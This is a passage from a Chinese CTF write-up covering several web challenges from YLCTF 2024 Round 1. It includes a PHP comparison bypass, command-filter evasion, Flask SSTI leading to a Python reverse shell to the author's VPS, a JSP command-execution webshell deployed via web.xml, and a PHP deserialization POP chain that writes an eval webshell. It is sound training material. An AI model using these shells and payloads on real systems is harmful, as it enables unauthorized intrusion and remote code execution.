class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-number">999999</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$key</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&gt;<span class="hljs-number">1234</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>a是匹配是否有六个字母，b是大于这个数就行函数构造绕过就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://challenge.yuanloo.com:21836/f1ag.php&#x27;</span><br>payload = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;1000000eeeeee&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;1235abc&#x27;</span><br>&#125;<br>response = requests.post(url, data=payload)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h5 id="round-1-shxpl"><a class="markdownIt-Anchor" href="#round-1-shxpl"></a> [Round 1] shxpl</h5><p>测试一下常见的ls和cat都被禁用了，这里空格用%09进行绕过，联合查询一下</p><p><img src="/../../images/ylctf/2024/shxpl1.png" alt="shxpl1"></p><p>然后执行cat /flag 参照上面的内容</p><p><img src="/../../images/ylctf/2024/shxpl2.png" alt="shxpl2"></p><h5 id="round-1-injct"><a class="markdownIt-Anchor" href="#round-1-injct"></a> [Round 1] Injct</h5><p>简单测了一下是xss还是ssti，发现是flask的模板注入，测试一下常见的花括号被禁了，用fenjing看看内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m fenjing crack --url http://challenge.yuanloo.com:25882/greet --inputs name --method POST<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/Injct1.png" alt="Injct1"></p><p>可以shell到但是试了常见的命令不能成功</p><p><img src="/../../images/ylctf/2024/Injct2.png" alt="Injct2"></p><p>考虑到这是python写的网站，用弹个shell给我的vps,成功拿到shell得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&quot;8.130.42.113&quot;, 5566)); [os.dup2(s.fileno(), i) for i in (0, 1, 2)]; subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/shxpl3.png" alt="shxpl3"></p><h5 id="round-1-toxec复现"><a class="markdownIt-Anchor" href="#round-1-toxec复现"></a> [Round 1] TOXEC(复现)</h5><p>测试了一下发现上传jsp文件会直接杀掉，又dirsearch扫了一下发现在<code>WEB-INF</code>有大量的404回显，猜测可能和羊城杯的题目相似(虽然我没写bushi),先上传一个shell.xml,是jsp的回显马</p><p>先上传这个，bp抓包改一下文件名</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123;  <br>    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();  <br>    int a = -1;  <br>    byte[] b = new byte[2048];  <br>    out.print(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&quot;);  <br>    while((a=in.read(b))!=-1)&#123;  <br>        out.print(new String(b));  <br>    &#125;  <br>    out.print(&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>&quot;);  <br>&#125;  <br><br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/TOXEC.png" alt="TOXEC"></p><p>然后再上传下面这个也需要改成对应的文件格式将上面的xml解析成jsp，传入马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jsp-file</span>&gt;</span>/WEB-INF/shell.xml<span class="hljs-tag">&lt;/<span class="hljs-name">jsp-file</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/orange<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后的结果如下</p><p><img src="/../../images/ylctf/2024/TOXEC1.png" alt="TOXEC1"></p><h5 id="round-1-pexpl复现"><a class="markdownIt-Anchor" href="#round-1-pexpl复现"></a> [Round 1] pExpl(复现)</h5><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileHandle</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileName</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$mode</span> = <span class="hljs-string">&#x27;r&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fileName = <span class="hljs-variable">$fileName</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fileHandle = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$mode</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;fileHandle) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Unable to open file: <span class="hljs-subst">$fileName</span>&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File opened: <span class="hljs-subst">$fileName</span>\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readLine</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLine</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle, <span class="hljs-variable">$data</span> . PHP_EOL);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;fileName) &amp;&amp;!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;fileHandle)) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File closed: <span class="hljs-subst">&#123;$this-&gt;fileName&#125;</span>\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userData</span> = [];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> == <span class="hljs-string">&#x27;password&#x27;</span>) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$value</span>, PASSWORD_DEFAULT);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;userData[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;userData[<span class="hljs-variable">$name</span>] ?? <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;params) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;data) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$this</span>-&gt;data) &gt; <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;data,<span class="hljs-variable">$this</span>-&gt;params);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;userData[<span class="hljs-variable">$name</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logFile</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lastEntry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logFile</span> = <span class="hljs-string">&#x27;application.log&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logFile = <span class="hljs-variable">$logFile</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>, <span class="hljs-variable">$message</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;lastEntry = <span class="hljs-string">&quot;[&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>) . <span class="hljs-string">&quot;] [<span class="hljs-subst">$level</span>] <span class="hljs-subst">$message</span>&quot;</span> . PHP_EOL;<br><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;logFile, <span class="hljs-variable">$this</span>-&gt;lastEntry, FILE_APPEND);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setLogFile</span>(<span class="hljs-params"><span class="hljs-variable">$logFile</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logFile = <span class="hljs-variable">$logFile</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearOldLogs</span>(<span class="hljs-params"><span class="hljs-variable">$daysToKeep</span> = <span class="hljs-number">30</span></span>) </span>&#123;<br>        <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;*.log&quot;</span>);<br>        <span class="hljs-variable">$now</span> = <span class="hljs-title function_ invoke__">time</span>();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$now</span> - <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file</span>) &gt;= <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-variable">$daysToKeep</span>) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$validLevels</span> = [<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$validLevels</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>[<span class="hljs-number">0</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid log level: <span class="hljs-subst">$name</span>&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$message</span>, <span class="hljs-variable">$level</span> = <span class="hljs-string">&#x27;INFO&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$level</span>, <span class="hljs-variable">$message</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Test!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Test!&quot;</span>);<br></code></pre></td></tr></table></figure><p>根据这里可以使用php的短标签，<code>throw new Exception(&quot;Test!&quot;);</code>可以利用GC机制进行绕过,简单的来说就用构造数组进行绕过</p><p>再分析一下上面的pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;fileName) &amp;&amp;!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;fileHandle)) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File closed: <span class="hljs-subst">&#123;$this-&gt;fileName&#125;</span>\n&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>echo</code>可以触发<code>__toString</code>魔术</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __toString() &#123;<br>        <span class="hljs-keyword">if</span>(is_string($<span class="hljs-keyword">this</span>-&gt;params) &amp;&amp; is_array($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">data</span>) &amp;&amp; count($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">data</span>) &gt; <span class="hljs-number">1</span>)&#123;<br>            call_user_func($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">data</span>,$<span class="hljs-keyword">this</span>-&gt;params);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>call_user_func</code> 函数用于回调构造，不能直接触发命令执行，由于有参数限制，也不能直接调用，可以尝试构造不存在的函数以此来触发<code>__call</code>魔术</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>    <br>        <span class="hljs-variable">$validLevels</span> = [<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$validLevels</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>[<span class="hljs-number">0</span>]);<span class="hljs-comment">//调用 log 方法，传递日志级别（转换为大写）和第一个参数 $arguments[0]，这通常是要记录的消息。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid log level: <span class="hljs-subst">$name</span>&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要调用到 <code>array</code> 中的一个，然后在触发文件写入，构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileHandle</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileName</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$fileName</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fileName = <span class="hljs-variable">$fileName</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userData</span> = [];<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logFile</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lastEntry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logFile</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logFile = <span class="hljs-variable">$logFile</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 创建 Logger 对象</span><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>(<span class="hljs-string">&quot;/var/www/html/1.php&quot;</span>);<br><span class="hljs-comment">// 创建 User 对象</span><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-comment">// 为 User 对象的属性赋值</span><br><span class="hljs-variable">$b</span>-&gt;data = [<span class="hljs-variable">$c</span>, <span class="hljs-string">&quot;info&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-string">&#x27;&lt;?=@eval($_POST[1]);?&gt;&#x27;</span>;  <br><span class="hljs-comment">// 创建 FileHandler 对象，传入 User 对象</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">// 序列化并替换特定字符串</span><br><span class="hljs-variable">$a1</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a1</span>);<br><span 